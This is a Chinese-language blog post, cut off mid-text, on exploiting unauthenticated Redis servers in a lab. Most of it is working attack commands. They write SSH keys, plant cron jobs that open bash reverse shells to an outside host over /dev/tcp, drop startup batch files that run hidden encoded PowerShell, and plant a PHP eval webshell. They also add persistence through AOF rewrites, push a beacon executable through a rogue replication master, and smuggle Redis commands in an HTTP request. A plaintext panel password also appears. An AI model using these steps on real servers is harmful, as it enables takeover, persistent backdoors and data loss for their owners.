<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Redis漏洞利用</title>
      <link href="/2021/10/09/redis-lou-dong-li-yong/"/>
      <url>/2021/10/09/redis-lou-dong-li-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Redis 是一种开源、基于内存的数据结构存储，被用作数据库、缓存和消息代理。其在低版本(&lt;3.2.0 ，从 3.2.0 版本开始，当 Redis 使用默认配置（绑定所有接口）并且没有任何密码来访问它时，它会进入一种称为保护模式的特殊模式。在这种模式下，Redis 只回复来自环回接口的查询，并回复从其他地址连接的客户端有错误，解释发生了什么以及如何正确配置 Redis。)上默认配置绑定在0.0.0.0:6379上且未设置密码验证，导致未授权访问，可结合其他命令组合获取权限。Redis安全性介绍 <a href="https://redis.io/topics/security">https://redis.io/topics/security</a> 。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>环境根据需要选择，Ubuntu/Centos/Windows下环境搭建可以参考下列记录：</p><h3 id="Redis连接-管理工具"><a href="#Redis连接-管理工具" class="headerlink" title="Redis连接/管理工具"></a>Redis连接/管理工具</h3><p>1.链接工具包括<a href="https://redis.io/topics/rediscli">Redis-cli</a>和打包好的二进制<a href="https://github.com/yanghaoi/exploits/tree/master/Redis">管理工具</a>。Redis-cli是Redis的默认连接工具，安装完成后自带。其命令格式为<code>redis-cli -h host -p port -a password command</code>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d8404e2e7e21ff91cb8d5c33e8bb6162.png"></p><p>2.<a href="https://github.com/caoxinyu/RedisClient">RedisClient</a> 是一个带GUI的管理工具，有exe和Jar包两种可执行文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b9c3e605076e53db04eacead51fa9d22.png"></p><p>3.<a href="https://github.com/lloy1231/RedisDesktopManager-Windows">redis-desktop-manager</a> 是开源的可视化工具，但是新版本的安装包需要付费：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/832c0d96d1647bc1aa55340600d03ca9.png"></p><p>4.<a href="https://github.com/qishibo/AnotherRedisDesktopManager">AnotherRedisDesktopManager</a>，这是另一个可视化管理工具，开源免费：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f198fabfa3bbec5e98742d65133b75af.png"></p><p>5.其他方式<br>其他还可以用NC工具来连接使用。甚至在未授权的情况下还可以用python的urllib2模块的http请求走私特性利用：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> urllib2url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:6379?info HTTP/1.1\r\nflushall\r\nconfig set dir C:/\r\nconfig set dbfilename shell.php\r\nset 'webshell' '&lt;?php phpinfo();exit(666);?>'\r\nsave\r\nQUIT\r\na:a\r\n\r\n"</span>htmlpage <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>htmlpage<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Redis-Install-For-Linux"><a href="#Redis-Install-For-Linux" class="headerlink" title="Redis Install For Linux"></a>Redis Install For Linux</h3><p>在Linux上安装Redis，一般以源码编译方式安装，源码详见：<a href="https://github.com/redis/redis">Redis仓库</a>     <a href="https://redis.io/download">官网下载地址</a> 。<br>环境搭建首先以源码编译安装的方式在Linux下搭建3.2.0来验证默认配置下的保护模式，然后安装3.0.7版本在默认配置下进行利用，最后安装4.x/5.x/6.x配置未授权进行利用。</p><p>1.先安装下3.2.0版本，观察在3.2.0的默认配置下是否如官网描述的安全性情况：</p><pre class="line-numbers language-shell"><code class="language-shell">$ wget https://download.redis.io/releases/redis-3.2.0.tar.gz$ tar xzf redis-3.2.0.tar.gz$ cd redis-3.2.0$ make$ cd src && ./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ed7c038d7978ce468ce1d0ef7baea7cc.png"><br>这时候使用外部IP连接时果然会提示，所以在Linux版本&gt;=3.2.0以上没有手动配置绑定在外部IP上的话是不能远程利用的：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f0d65cdb6884b0218f0c93ec285a0b18.png"></p><p>2.安装3.0.7(&lt;3.2.0最近的就是这个了)：</p><pre class="line-numbers language-shell"><code class="language-shell">$ wget https://download.redis.io/releases/redis-3.0.7.tar.gz$ tar xzf redis-3.0.7.tar.gz$ cd redis-3.0.7$ make$ cd src && ./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c897142bf1526e1e2e2b349066881acb.png"></p><p>3.Redis6.2.6安装</p><pre class="line-numbers language-shell"><code class="language-shell">$ wget https://download.redis.io/releases/redis-6.2.6.tar.gz$ tar xzf redis-6.2.6.tar.gz$ cd redis-6.2.6$ make$ cd src && ./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4.Docker 环境<br><a href="https://github.com/vulhub/vulhub/tree/master/redis/4-unacc">vulhub</a><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ed8fb9d44d975a36d16033f3a26f3ab3.png"></p><p><a href="https://hub.docker.com/_/redis">dockerhub-redis</a><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/792704d7190b0d603cb165a695c2f52d.png"></p><pre class="line-numbers language-bash"><code class="language-bash">docker pull redis:5-bullseye<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9c73d5c602c38d59d9e96092e13ca56e.png"></p><h3 id="Dockerhub-CentOS"><a href="#Dockerhub-CentOS" class="headerlink" title="Dockerhub-CentOS"></a>Dockerhub-CentOS</h3><p>使用Docker在CentOS容器内部署PHPStudy和Redis环境：</p><pre class="line-numbers language-bash"><code class="language-bash">docker pull centos:latestdocker run -tid --name centos_1 -p 6379:6379 -p 18080:18080 -p 8081:8080 -p 8082:80 -p 9080:9080 -p 2222:22 --privileged<span class="token operator">=</span>true centos:latest /sbin/inityum <span class="token function">install</span> crontabs   <span class="token comment" spellcheck="true">#安装计划任务服务</span>systemctl <span class="token function">enable</span> crond <span class="token comment" spellcheck="true">#设为开机启动</span>systemctl start crond  <span class="token comment" spellcheck="true">#启动crond服务</span>systemctl status crond <span class="token comment" spellcheck="true">#查看状态</span>yum <span class="token function">install</span> <span class="token function">wget</span><span class="token comment" spellcheck="true">#下载编译好的redis-server到CentOS</span><span class="token function">wget</span> http://xxx/redis-server <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +x redis-server <span class="token operator">&amp;&amp;</span> ./redis-server<span class="token comment" spellcheck="true">#openssh</span>yum <span class="token function">install</span> openssh*systemctl <span class="token function">enable</span> sshd systemctl start sshd<span class="token comment" spellcheck="true">#phpstudy，内置了很多软件安装</span>yum <span class="token function">install</span> -y <span class="token function">wget</span> <span class="token operator">&amp;&amp;</span> <span class="token function">wget</span> -O install.sh https://notdocker.xp.cn/install.sh <span class="token operator">&amp;&amp;</span> sh install.sh请用浏览器访问面板:外网:http://171.212.137.205:9080/B3A929内网:http://172.17.0.3:9080/B3A929系统初始账号:admin系统初始密码:hLQGQ6HGP9<span class="token comment" spellcheck="true">#ssh -fgN -L 8080:localhost:80 localhost</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9345d24c4c1123f0a84def9d60eef471.png"></p><h3 id="Redis-Install-For-Windows"><a href="#Redis-Install-For-Windows" class="headerlink" title="Redis Install For Windows"></a>Redis Install For Windows</h3><p>Windows下找到的几个版本安装包：<a href="https://github.com/dmajkic/redis/downloads">Redis&lt;2.4.5安装包</a> ， <a href="https://www.xp.cn/download.html">PHPStudy-Redis3.0.504</a> ， <a href="https://github.com/microsoftarchive/redis/releases">Redis-x64-3.2.100.msi</a>分别是2.4.5，3.0.504，3.2.100三个版本，PHPStudy中启动效果：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4a64eea99d9856ecf4545f935aff74ac.png"><br>Redis-x64-3.2.100.msi安装后会以服务形式启动：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/eb11327e4b205370d64d7e2b55e1cb7e.png"></p><h2 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h2><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p><strong>Dict协议</strong></p><pre class="line-numbers language-html"><code class="language-html">dict://192.168.200.97:6379/auth:password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>Metasploit模块</strong></p><pre class="line-numbers language-cmd"><code class="language-cmd">use auxiliary/scanner/redis/redis_loginset rohosts 192.168.11.133run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9abaff419efd5fc973b2dc0cff95f28.png"></p><p><strong>Hydra</strong></p><pre class="line-numbers language-stylus"><code class="language-stylus"><span class="token property-declaration"><span class="token property">hydra</span> -P redis_pass<span class="token operator">.</span>txt redis<span class="token punctuation">:</span></span><span class="token comment" spellcheck="true">//192.168.11.133</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/bd5f9c678d6039c2e3f460c025ca20a3.png"></p><p><strong>超级弱口令工具</strong><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/6de20cd9b8d9e90a395bc957b2b20b2a.png"></p><h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p>主要是利用一些命令获取信息，获取客户端连接信息： <code>CLIENT LIST</code><br> <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b84eb1177fba33809271c0dd872b5e99.png"><br> 探测文件是否存在(&gt;2.6.0)：<code>EVAL "return dofile('C:/Users/yanghao/NTUSER.DAT')" 0</code><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/fe9fd97c62e0cc0443e241422100b2fc.png"></p><pre class="line-numbers language-cmd"><code class="language-cmd">#检测 redis 服务是否启动ping#查看是否设置了密码验证CONFIG get requirepass#设置密码为runoobAUTH "runoob"#获取 Redis 服务器的各种信息和统计数值INFO#查询配置参数CONFIG GET#设置配置参数CONFIG STE#设置KEY"runoobkey"的值为redis SET runoobkey redis#删除KEY"runoobkey"DEL runoobkey#在后台异步保存当前数据库的数据到磁盘BGSAVE#返回当前数据库的 key 的数量DBSIZE#让 Redis 服务崩溃DEBUG SEGFAULT#删除所有数据库的所有keyFLUSHALL#删除当前数据库的所有keyFLUSHDB#返回最近一次 Redis 成功将数据保存到磁盘上的时间，以 UNIX 时间戳格式表示LASTSAVE#设置远程主服务器SLAVEOF host port / REPLICAOF host port #断开主从连接SLAVEOF ON ONE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Ridis持久化-数据集备份-利用"><a href="#Ridis持久化-数据集备份-利用" class="headerlink" title="Ridis持久化(数据集备份)利用"></a>Ridis持久化(数据集备份)利用</h3><p><a href="https://redis.io/topics/persistence">Redis持久化</a>是指可以将数据集保存到本地磁盘中的操作，有RDB和AOF两种方式。通过数据备份操作将数据写入到磁盘中进行利用，但是某些格式写入数据的会包含Redis备份的标记存在脏数据，这只能用于一些有容错性的文件利用。</p><h4 id="RDB备份文件利用"><a href="#RDB备份文件利用" class="headerlink" title="RDB备份文件利用"></a>RDB备份文件利用</h4><p>基础的命令如下：</p><pre class="line-numbers language-text"><code class="language-text">DBSIZE                   # 统计KEYSflushall                  # 如果键过多导致备份过大，全部清空KEYS(危险)CONFIG GET slave-read-only      # 查询只读配置CONFIG SET slave-read-only no    # 关闭只读配置CONFIG GET DIR              # 查询目录CONFIG SET dir /path/www/html    # 修改备份目录  CONFIG GET dbfilename         # 查询备份文件名，方便恢复CONFIG SET dbfilename trojan.php  # 修改备份文件名为我们的shell名SET trojan "<?php phpinfo(); ?>"  # 设置KEY和值BGSAVE  / SAVE              # 异步/阻塞 保存当前数据库的数据到磁盘DEL trojan                 #删除恶意键          恢复：CONFIG SET dir /usr/local/redis   #恢复原来的目录CONFIG SET dbfilename dump.rdb   # 恢复原来的备份文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Linux写SSH公钥</strong><br><em>需要有对应用户目录的写入权限且ssh服务可以连接并开启了公钥登录，在Ubuntu上用Redis3.0.7测试</em><br>生成密钥对： <code>ssh-keygen -t rsa</code><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ee761b74f8d31b1b0843204eea9ec020.png"><br>在id_rsa.pub文件中首尾加上换行(复制完记得改回去)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9e74eff4168d783708cb94706a97d09a.png"><br>执行下列命令</p><pre class="line-numbers language-gams"><code class="language-gams">config set dir /root/.sshconfig set dbfilename authorized_keysset authorized_keys "id_rsa.pub的内容"bgsave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a88d17df4b2feb84d5ba54c964384dd3.png"><br>查看靶机已经写入成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d71634977764e04614840a94d832ea2d.png"><br>登录成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9a696a39954a3c85bcc4f66dd9d2ad0.png"></p><p><strong>Linux写计划任务</strong><br>Linux下操作计划任务需要root权限。<a href="https://www.thegeekdiary.com/centos-rhel-begginners-guide-to-cron/">计划任务介绍</a> <a href="https://zh.wikipedia.org/wiki/Cron#crontab%E6%96%87%E4%BB%B6">crontab文件</a></p><p><code>/etc/crontab</code>和<code>/etc/cron.*</code>目录下的任务时间表（crontabs）文件是系统层次的，格式如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 文件格式说明</span><span class="token comment" spellcheck="true"># ┌──分钟（0 - 59）</span><span class="token comment" spellcheck="true"># │ ┌──小时（0 - 23）</span><span class="token comment" spellcheck="true"># │ │ ┌──日（1 - 31）</span><span class="token comment" spellcheck="true"># │ │ │ ┌─月（1 - 12）</span><span class="token comment" spellcheck="true"># │ │ │ │ ┌─星期（0 - 6，表示从周日到周六）</span><span class="token comment" spellcheck="true"># │ │ │ │ │</span><span class="token comment" spellcheck="true"># *  *  *  *  *  用户名 执行的命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>系统层次的任务时间表（crontabs）的任务经常会指定一个或以上的用户进行执行，因此任务时间表（crontabs）文件需要增加“用户名”字段。<code>/etc/crontab</code> 文件定期自动执行多个子目录中的项目。放置在不同目录中<code>/etc/cron.*</code>脚本按照下面给出的时间间隔运行。这些目录中的所有脚本都以 root 权限运行。<br>| 目录 | 时间 |<br>|—–|—–|<br>| /etc/cron.d  | 几分钟 |<br>| /etc/cron.hourly |每小时的第一分钟 |<br>| /etc/cron.daily | 每天凌晨 3:05 至晚上 10.55 |<br>| /etc/cron.weekly |自上次执行后 7 天后的上午 3:25 至晚上 11:10 之间 |<br>| /etc/cron.monthly | 自上次执行后一个月后的凌晨 3:45 至晚上 11:30 之间 | </p><p><code>/var/spool/cron/</code>下的任务时间表（crontab）文件是用户层次的（但是只能root权限建），计划任务文件的名称与用户的用户名相同，格式如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 文件格式说明</span><span class="token comment" spellcheck="true"># ┌──分钟（0 - 59）</span><span class="token comment" spellcheck="true"># │ ┌──小时（0 - 23）</span><span class="token comment" spellcheck="true"># │ │ ┌──日（1 - 31）</span><span class="token comment" spellcheck="true"># │ │ │ ┌─月（1 - 12）</span><span class="token comment" spellcheck="true"># │ │ │ │ ┌─星期（0 - 6，表示从周日到周六）</span><span class="token comment" spellcheck="true"># │ │ │ │ │</span><span class="token comment" spellcheck="true"># *  *  *  *  * 被执行的命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于Ubuntu的计划任务不能容错，语法会进行严格检查:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2c504bdb7af9d8e9b5c186a817c25768.png"><br>所以写计划任务用到了Docker搭建CentOS环境来测试，Redis命令写入计划任务文件夹<code>/etc/cron.d</code>：</p><pre class="line-numbers language-bash"><code class="language-bash">config <span class="token keyword">set</span> <span class="token function">dir</span> /etc/cron.dconfig <span class="token keyword">set</span> dbfilename x<span class="token keyword">set</span> x <span class="token string">"\n\nSHELL=/bin/bash\n\n* * * * * root bash -i >&amp; /dev/tcp/192.168.11.1/6666 0>&amp;1\n\n"</span><span class="token comment" spellcheck="true">#set x "\n\n* * * * * ftp bash -i >&amp; /dev/tcp/192.168.11.1/6666 0>&amp;1\n\n"</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a01700f56255272f2e5657941c08f9f3.png"></p><p>写入 <code>/var/spool/cron/</code>：</p><pre class="line-numbers language-bash"><code class="language-bash">FLUSHALLconfig <span class="token keyword">set</span> <span class="token function">dir</span> /var/spool/cronconfig <span class="token keyword">set</span> dbfilename bin  <span class="token comment" spellcheck="true"># 以用户名命名文件</span><span class="token keyword">set</span> x <span class="token string">"\n\n* * * * * bash -i >&amp; /dev/tcp/192.168.11.1/6666 0>&amp;1\n\n"</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反弹回bin用户的shell:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c5f026052faf1c2c331f8c88d055d30a.png"></p><p><strong>Windows写启动项</strong><br>通过文件写入启动项后，在系统重启后执行脚本，主要是写.bat .cmd等支持容错的文件执行其他命令(powershell、mshta、regsvr32等等)来利用(windows下换行<code>\r\n</code>)：</p><pre class="line-numbers language-cmd"><code class="language-cmd"># 这是系统启动项，如果权限不足时利用set dir或EVAL "return dofile"目录/文件探测方式去找用户启动目录config set dir "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp" config set dbfilename info.batset x "\r\n\r\npowershell.exe -nop -w hidden -enc xxxxx\r\n\r\n"save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/744be6544214bae378f65fce5ee066d8.png"></p><p><strong>Windows文件覆盖</strong><br>有时候目标服务器一直不会重启，那么可以考虑覆盖一些其他的bat文件等来增加触发几率，可以利用<code>EVAL "return dofile('xxx') 0</code>探测文件是否真的存在。PHPStudy环境中的bat文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9e48cf26937d98b3a102eb6b412dd96b.png"><br>通过Redis默认的dir参数可以知道绝对路径：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/0b77db0e5556150ce63a48b52033dc8a.png"><br>比如覆盖Apache下的check.bat脚本(如果触发后就会执行命令):</p><pre class="line-numbers language-cmd"><code class="language-cmd">config set dir "D:/phpstudy_pro/Extensions/Apache2.4.39/bin"config set dbfilename check.batset x "\r\n\r\nhttpd.exe\r\ncmd /c calc\r\npause > nul\r\n"save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/fc91a408ddc88709de58aba050248a44.png"></p><p><strong>WEB绝对路径写Wbeshell</strong><br>如果Redis环境中同时存在WEB环境，在Redis权限比较高的情况下，可以尝试获取到绝对路径后写入Webshell，一般以二进制文件启动的程序是启动用户的权限，比较适合利用，以安装服务(yum install redis)等启动的权限会比较有限。</p><p>Windows+PHPStudy:</p><pre class="line-numbers language-cmd"><code class="language-cmd">config set dir "D:/phpstudy_pro/WWW" config set dbfilename redisshell.phpset x "\r\n\r\n<?php eval($_GET[1]);?>\r\n\r\n"save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9bae99834a2ca2f2665c1b9b660413d.png"></p><p>在CentOS+PHPStudy下：</p><pre class="line-numbers language-cmd"><code class="language-cmd">config set dir "/var/www/html" config set dbfilename redisshell.phpset x "\n\n<?php eval($_GET[1]);?>\n\n"save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2ef26d7345cd7a1e6e20a88abe52e49e.png"></p><p>Centos + Apache下:</p><pre class="line-numbers language-cmd"><code class="language-cmd">config set dir "/var/www/html" config set dbfilename redisshell.phpset x "\n\n<?php eval($_GET[1]);?>\n\n"save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f8df2ca875ec434336e7d9fd60513394.png"><br>如果权限不足，无法写入：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2e23b73f321efe0a5d5a5fbba526a674.png"></p><h4 id="AOF-配置重写持久化"><a href="#AOF-配置重写持久化" class="headerlink" title="AOF+配置重写持久化"></a>AOF+配置重写持久化</h4><p>由于不能设置appendfilename参数，不能AOF写任意后缀文件。但是可以通过该方式进行权限维持，在配置文件开启AOF后，Redis在重启后会执行其中的命令以恢复数据，结合配置文件重写达到redis在重启后写入webshell的效果(save之类的命令不会被aof记录)，执行命令：</p><pre class="line-numbers language-cmd"><code class="language-cmd">#每秒保存命令（如果已经在默认位置存在aof文件，就使用该配置保存命令，不要使用bgrewriteaof，redis会优先恢复默认目录的aof,用该命令控制写入aof的内容即可。）#config set appendfsync everysec#关闭只读CONFIG SET slave-read-only no      #设置持久化数据保存目录config set dir "D:/phpstudy_pro/WWW/Redis"   #设置RDB文件名config set dbfilename redisshell.php  #设置一个keyset x "\r\n\r\n<?php eval($_GET[1]);?>\r\n\r\n"   #设置aof增长重写幅度，1kb涨到1.5kb就重写config set auto-aof-rewrite-percentage 50#设置AOF文件最小重写的大小（字节）。第一次达到1mb就重写config set auto-aof-rewrite-min-size 10000#表示10秒内如果至少有 1 个 key 的值变化，则保存rdbconfig set save "10 1"   #将内存中执行的命令保存到aof文件 bgrewriteaof #开启AOF持久化config set appendonly yes #重写配置CONFIG REWRITE                       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于在10秒内设置了key,触发保存规则，写入了PHP文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f89cc1a5cae127346a6582c753dea373.png"><br>模拟管理员删除PHP文件、然后重启Redis、Redis工作后的键写入:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/db05612d3c4eae8e9499a12e2bf884d5.gif"></p><h3 id="主从复制无损写文件-master-slave模式"><a href="#主从复制无损写文件-master-slave模式" class="headerlink" title="主从复制无损写文件(master/slave模式)"></a>主从复制无损写文件(master/slave模式)</h3><p>通过主从复制，master 会将内存数据通过 bgsave 落地到 rdb，从而同步给slave。攻击者可以伪造一个master，保存到rdb的数据可以自行控制，这样就没有附加的额外数据，落地无损的文件。利用命令来设置主服务器<code>SLAVEOF host port / REPLICAOF host port</code>(REPLICAOF &gt; 5.0.0) ，执行命令后的Redis身份会切换为从服务器，然后通过与主服务器交互进行数据同步，但是会导致目标Redis数据丢失，可以使用<a href="https://www.cnblogs.com/yanjieli/p/13085481.html">redis-dump</a>、redis-load等第三方工具进行数据备份导出，也可以在目标Redis上设置rdb、aof备份。利用 <a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a> 脚本模拟master测试利用(需要网络互通,否则脚本会卡在从机连接位置)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/44800dff8965ebaa84c88b226962fb81.png"></p><p><strong>Linux写SSH公钥</strong></p><pre class="line-numbers language-cmd"><code class="language-cmd">python3 RedisWriteFile.py --rhost 192.168.11.133 --rport 6379 --lhost 192.168.11.1 --lport 16379 --rpath "/root/.ssh" --rfile authorized_keys --lfile ./SSH/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/85962012cf8bcebde873f98e9707d9eb.png"></p><p><strong>Linux写计划任务</strong><br>Windows下编写计划任务文件注意<code>\r\n</code>换行要变成<code>\n\n</code>,Ubuntu计划任务文件尾行需要换行：</p><pre class="line-numbers language-elixir"><code class="language-elixir">SHELL<span class="token operator">=</span><span class="token operator">/</span>bin<span class="token operator">/</span>bashPATH<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token attr-name">sbin:</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token attr-name">bin:</span><span class="token operator">/</span><span class="token attr-name">sbin:</span><span class="token operator">/</span><span class="token attr-name">bin:</span><span class="token operator">/</span>usr<span class="token operator">/</span><span class="token attr-name">sbin:</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> root bash <span class="token operator">-</span>i <span class="token operator">></span><span class="token operator">&amp;</span> <span class="token operator">/</span>dev<span class="token operator">/</span>tcp<span class="token operator">/</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span><span class="token operator">/</span><span class="token number">6667</span> <span class="token number">0</span>><span class="token argument variable">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>脚本执行命令：</p><pre class="line-numbers language-cmd"><code class="language-cmd">python3 RedisWriteFile.py --rhost 192.168.11.133 --rport 6379 --lhost 192.168.11.1 --lport 16379 --rpath "/etc/cron.d" --rfile shell --lfile ./cron/cron.d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反弹成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/556c48f2fd6871459c7122db487e6afe.png"><br><strong>Windows写启动项</strong></p><pre class="line-numbers language-cmd"><code class="language-cmd">python3 RedisWriteFile.py --rhost 192.168.200.97 --rport 6379 --lhost 192.168.200.138 --lport 16379 --rpath "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp" --rfile beacon.exe --lfile beacon.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/575cd5cb885b8c831ad1805f222eeac9.png"></p><p><strong>Windows文件覆盖/新增</strong><br>现在可以对一些常用位置的文件进行覆盖了，如桌面快捷方式、快速启动栏、软件程序、动态链接库等。这些操作基本上都是需要管理员权限的。</p><p><em>快捷方式</em><br>先使用文件探测方式探测是否存在常见的快捷方式并确认好启动文件位置，一般在公用桌面存在一些：</p><pre class="line-numbers language-cmd"><code class="language-cmd">EVAL "return dofile('C:/Users/Public/Desktop/Google Chrome.lnk')" 0EVAL "return dofile('C:/Users/Public/Desktop/Notepad++.lnk')" 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在本地建立快捷方式 ，根据在目标主机上获取的文件位置信息可以在快捷方式的目标中写入命令<code>C:\Windows\System32\cmd.exe /c calc &amp;  "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"</code> ，将运行方式设置为最小化：<br><img 